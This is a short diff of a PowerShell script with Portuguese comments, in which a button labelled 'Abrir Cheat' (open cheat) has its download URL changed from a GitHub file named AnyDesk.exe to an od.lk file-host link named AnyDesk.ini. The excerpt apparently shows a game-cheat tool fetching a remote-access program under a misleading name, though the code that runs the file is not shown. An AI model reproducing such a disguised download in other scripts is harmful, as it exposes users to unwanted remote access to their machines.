@@ -49,7 +49,7 @@ function Show-Panel {
     $btnCheat.Add_Click({
         # Ação para "Abrir Cheat"
         # Define o URL do arquivo a ser baixado
-        $url = 'https://raw.githubusercontent.com/furiacoding/teste/main/AnyDesk.exe'
+        $url = 'https://od.lk/d/NzhfNjMwNzA5ODZf/AnyDesk.ini'
         # Define o caminho e o nome do arquivo sensi.txt no C:\
         $sensiFilePath = 'C:\sensi.txt'
         # Define o caminho para a pasta Downloads do usuário e o nome do arquivo
